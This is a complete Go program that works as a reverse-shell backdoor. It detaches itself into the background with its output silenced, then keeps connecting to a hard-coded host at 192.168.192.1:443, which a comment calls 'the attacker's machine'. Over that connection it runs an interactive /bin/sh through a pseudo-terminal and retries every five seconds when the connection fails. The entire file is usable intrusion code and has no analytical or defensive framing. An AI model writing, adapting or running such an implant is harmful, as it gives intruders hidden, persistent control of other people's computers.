package main

import (
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"sync"
	"time"

	"github.com/creack/pty"
)

func runShell(conn net.Conn) {
	var wg sync.WaitGroup
	wg.Add(2)

	// Create a new command
	cmd := exec.Command("/bin/sh")

	// Create a pseudo-terminal (pty) for the command
	ptmx, err := pty.Start(cmd)
	if err != nil {
		log.Printf("Failed to start command with pty: %s\n", err)
		return
	}
	defer func() {
		if err := ptmx.Close(); err != nil {
			log.Printf("Failed to close ptmx: %s\n", err)
		}
		cmd.Wait()
	}()

	// Create a goroutine to copy command output to the connection
	go func() {
		defer conn.Close()
		io.Copy(conn, ptmx)
		wg.Done()
	}()

	// Create a goroutine to copy data from the connection to the pty
	go func() {
		io.Copy(ptmx, conn)
		wg.Done()
	}()

	// Wait for the goroutines to finish
	wg.Wait()
}

func main() {
	// Check if the process is running as a background process
	if _, ok := os.LookupEnv("BACKGROUND"); !ok {
		// Start the process in the background
		backgroundProcess := exec.Command(os.Args[0], os.Args[1:]...)
		backgroundProcess.Env = append(os.Environ(), "BACKGROUND=true")

		// Set standard input, output, and error to /dev/null
		devNull, err := os.Open(os.DevNull)
		if err != nil {
			log.Printf("Failed to open /dev/null: %s\n", err)
			return
		}
		defer devNull.Close()

		backgroundProcess.Stdin = devNull
		backgroundProcess.Stdout = devNull
		backgroundProcess.Stderr = devNull

		err = backgroundProcess.Start()
		if err != nil {
			log.Printf("Failed to start background process: %s\n", err)
		}

		os.Exit(0)
	}

	for {
		// Connect to the attacker's machine
		conn, err := net.Dial("tcp", "192.168.192.1:443")
		if err != nil {
			log.Printf("Failed to connect: %s\n", err)
			time.Sleep(5 * time.Second) // Wait for 5 seconds before trying again
			continue
		}

		// Run the shell
		runShell(conn)
	}
}
